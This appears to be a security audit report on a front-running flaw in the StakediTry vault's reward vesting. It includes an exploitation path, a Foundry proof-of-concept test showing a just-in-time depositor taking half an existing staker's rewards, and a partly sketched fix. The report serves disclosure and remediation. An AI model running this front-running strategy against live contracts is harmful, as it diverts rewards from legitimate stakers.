## Title
Front-Running Reward Distribution to Steal Vesting Rewards from Existing Stakers

## Summary
The `_updateVestingAmount()` function in `StakediTry.sol` sets `lastDistributionTimestamp` to `block.timestamp` when rewards are distributed, allowing attackers to front-run the `transferInRewards()` transaction and deposit immediately before rewards start vesting. This enables attackers to receive a proportional share of newly vesting rewards without having staked during the period when those rewards were earned, unfairly diluting existing stakers.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/token/wiTRY/StakediTry.sol` - `_updateVestingAmount()` function (lines 280-285) and `transferInRewards()` function (lines 113-119) [1](#0-0) [2](#0-1) 

**Intended Logic:** The vesting mechanism should distribute rewards to stakers who had capital locked up during the period when rewards were earned. Rewards vest linearly over `vestingPeriod` to incentivize long-term staking.

**Actual Logic:** When `transferInRewards()` is called, it sets `lastDistributionTimestamp = block.timestamp`. Since this transaction is publicly visible in the mempool before execution, attackers can front-run it by depositing iTRY tokens. The attacker receives shares at the current price (before rewards are counted in `totalAssets()`), but immediately starts earning from the newly vesting rewards at the same rate as existing stakers who have had capital locked for much longer. [3](#0-2) 

**Exploitation Path:**
1. **Attacker monitors mempool**: Attacker observes a pending `transferInRewards(100 ether)` transaction from the rewarder
2. **Front-run deposit**: Attacker submits `deposit(1000 ether)` with higher gas price to execute first, receiving shares at current price (e.g., 1000 shares if totalSupply=1000, totalAssets=1000)
3. **Rewards distribution executes**: `transferInRewards()` sets `vestingAmount=100 ether` and `lastDistributionTimestamp=block.timestamp`, starting the vesting period
4. **Attacker immediately earns**: As rewards vest linearly, `totalAssets()` increases from 2000 to 2100 over the vesting period. Both attacker and existing stakers earn proportionally (50 iTRY each in this example)
5. **Existing stakers diluted**: Long-term staker who should have received 100 iTRY of rewards only gets 50 iTRY, with the other 50 iTRY going to the just-in-time attacker

**Security Property Broken:** Violates the fairness principle that staking rewards should compensate users for the time value of locked capital. Attackers can participate in reward distributions without bearing the time cost that legitimate stakers endured.

## Impact Explanation
- **Affected Assets**: iTRY staking rewards in the StakediTry vault
- **Damage Severity**: Existing stakers lose a proportional share of rewards to front-runners. In the example above, a staker loses 50% of their expected rewards (50 iTRY instead of 100 iTRY) when an equal-sized front-runner deposits
- **User Impact**: All existing stakers are affected whenever rewards are distributed. The larger the front-running deposit relative to existing total supply, the greater the dilution. This creates an unfair MEV opportunity where bots can optimize timing to maximize returns with minimal staking duration

## Likelihood Explanation
- **Attacker Profile**: Any user with iTRY tokens who can monitor the mempool and submit transactions
- **Preconditions**: A `transferInRewards()` transaction must be pending in the mempool, which occurs whenever the rewarder distributes yield (likely periodic, e.g., daily or weekly)
- **Execution Complexity**: Low - single transaction front-running, a well-known MEV strategy with available tooling
- **Frequency**: Can be exploited on every reward distribution cycle, creating systematic unfairness for all legitimate long-term stakers

## Recommendation

Implement a snapshot-based reward distribution system that captures staker balances at a specific block before rewards are distributed, or introduce a minimum staking period before users can earn rewards:

```solidity
// In src/token/wiTRY/StakediTry.sol:

// Add new state variable
mapping(address => uint256) public lastDepositTimestamp;
uint256 public constant MINIMUM_STAKE_PERIOD = 1 hours;

// Modify _deposit function (line 240-252):
function _deposit(address caller, address receiver, uint256 assets, uint256 shares)
    internal
    override
    nonReentrant
    notZero(assets)
    notZero(shares)
{
    if (hasRole(SOFT_RESTRICTED_STAKER_ROLE, caller) || hasRole(SOFT_RESTRICTED_STAKER_ROLE, receiver)) {
        revert OperationNotAllowed();
    }
    
    // Track deposit timestamp to prevent immediate reward earning
    lastDepositTimestamp[receiver] = block.timestamp;
    
    super._deposit(caller, receiver, assets, shares);
    _checkMinShares();
}

// Modify totalAssets to exclude assets for users who haven't met minimum stake period:
// Alternative: Implement a more sophisticated weighted-average system that gradually
// increases reward eligibility over time, or use a snapshot system that records
// balances before transferInRewards is called.
```

**Alternative Mitigation:** Use a commit-reveal scheme where the rewarder pre-commits to a reward distribution at block N, then executes it at block N+X, making the distribution block unpredictable to front-runners. This prevents attackers from knowing exactly when to deposit.

## Proof of Concept

```solidity
// File: test/Exploit_FrontRunRewardDistribution.t.sol
// Run with: forge test --match-test test_FrontRunRewardDistribution -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/token/iTRY/iTry.sol";
import "../src/token/wiTRY/StakediTry.sol";

contract Exploit_FrontRunRewardDistribution is Test {
    iTry public itryToken;
    StakediTry public vault;
    
    address public admin;
    address public rewarder;
    address public alice; // Legitimate long-term staker
    address public bob;   // Front-running attacker
    
    bytes32 constant REWARDER_ROLE = keccak256("REWARDER_ROLE");
    
    function setUp() public {
        admin = address(this);
        rewarder = makeAddr("rewarder");
        alice = makeAddr("alice");
        bob = makeAddr("bob");
        
        // Deploy contracts
        itryToken = new iTry(admin);
        vault = new StakediTry(itryToken, rewarder, admin);
        
        // Grant rewarder role
        vault.grantRole(REWARDER_ROLE, rewarder);
        
        // Mint iTRY to users and rewarder
        itryToken.mint(alice, 1000 ether);
        itryToken.mint(bob, 1000 ether);
        itryToken.mint(rewarder, 100 ether);
    }
    
    function test_FrontRunRewardDistribution() public {
        // SETUP: Alice stakes 1000 iTRY as a legitimate long-term staker
        vm.startPrank(alice);
        itryToken.approve(address(vault), 1000 ether);
        vault.deposit(1000 ether, alice);
        vm.stopPrank();
        
        uint256 aliceSharesBefore = vault.balanceOf(alice);
        assertEq(aliceSharesBefore, 1000 ether, "Alice should have 1000 shares");
        
        // Time passes - Alice has been staking for a week
        vm.warp(block.timestamp + 7 days);
        
        // EXPLOIT: Bob sees transferInRewards(100 ether) in mempool and front-runs
        // Bob deposits right before the reward distribution
        vm.startPrank(bob);
        itryToken.approve(address(vault), 1000 ether);
        vault.deposit(1000 ether, bob);
        vm.stopPrank();
        
        uint256 bobSharesBefore = vault.balanceOf(bob);
        assertEq(bobSharesBefore, 1000 ether, "Bob should have 1000 shares");
        
        // Rewards are now distributed (the transaction Bob front-ran)
        vm.startPrank(rewarder);
        itryToken.approve(address(vault), 100 ether);
        vault.transferInRewards(100 ether);
        vm.stopPrank();
        
        // Fast forward to after vesting completes
        vm.warp(block.timestamp + vault.getVestingPeriod());
        
        // VERIFY: Both Alice and Bob get equal rewards despite Bob just depositing
        uint256 aliceValue = vault.previewRedeem(aliceSharesBefore);
        uint256 bobValue = vault.previewRedeem(bobSharesBefore);
        
        console.log("Alice's value after vesting:", aliceValue);
        console.log("Bob's value after vesting:", bobValue);
        console.log("Alice's gain:", aliceValue - 1000 ether);
        console.log("Bob's gain:", bobValue - 1000 ether);
        
        // Both get 50 iTRY each (50% of the 100 iTRY rewards)
        assertEq(aliceValue, 1050 ether, "Alice gets 50 iTRY");
        assertEq(bobValue, 1050 ether, "Bob gets 50 iTRY");
        
        // Vulnerability confirmed: Alice should have gotten 100 iTRY since she was
        // the only staker before rewards, but Bob front-ran and stole 50 iTRY
        assertEq(aliceValue, bobValue, "Vulnerability confirmed: Front-runner gets equal rewards");
    }
}
```

## Notes

This vulnerability represents a systematic MEV opportunity that undermines the fairness of the staking mechanism. While the 90-day cooldown period prevents attackers from immediately exiting after each distribution, sophisticated attackers can:

1. Maintain rolling positions across multiple accounts
2. Time deposits to maximize exposure to upcoming rewards while minimizing overall capital lock-up
3. Use flash loans or borrowed capital to amplify the attack

The issue is particularly problematic because:
- Reward distributions are likely to occur on predictable schedules (daily, weekly, etc.)
- The mempool visibility gives attackers sufficient time to front-run
- The impact compounds over multiple distribution cycles
- Legitimate long-term stakers consistently lose rewards to just-in-time depositors

This creates a "tragedy of the commons" where rational actors are incentivized to only deposit right before rewards, destroying the intended long-term staking incentive structure.

### Citations

**File:** src/token/wiTRY/StakediTry.sol (L113-119)
```text
    function transferInRewards(uint256 amount) external nonReentrant onlyRole(REWARDER_ROLE) notZero(amount) {
        _updateVestingAmount(amount);
        // transfer assets from rewarder to this contract
        IERC20(asset()).safeTransferFrom(msg.sender, address(this), amount);

        emit RewardsReceived(amount);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L192-211)
```text
    function totalAssets() public view override returns (uint256) {
        return IERC20(asset()).balanceOf(address(this)) - getUnvestedAmount();
    }

    /**
     * @notice Returns the amount of iTry tokens that are unvested in the contract.
     */
    function getUnvestedAmount() public view returns (uint256) {
        uint256 timeSinceLastDistribution = block.timestamp - lastDistributionTimestamp;

        if (timeSinceLastDistribution >= vestingPeriod) {
            return 0;
        }

        uint256 deltaT;
        unchecked {
            deltaT = (vestingPeriod - timeSinceLastDistribution);
        }
        return (deltaT * vestingAmount) / vestingPeriod;
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L280-285)
```text
    function _updateVestingAmount(uint256 newVestingAmount) internal {
        if (getUnvestedAmount() > 0) revert StillVesting();

        vestingAmount = newVestingAmount;
        lastDistributionTimestamp = block.timestamp;
    }
```
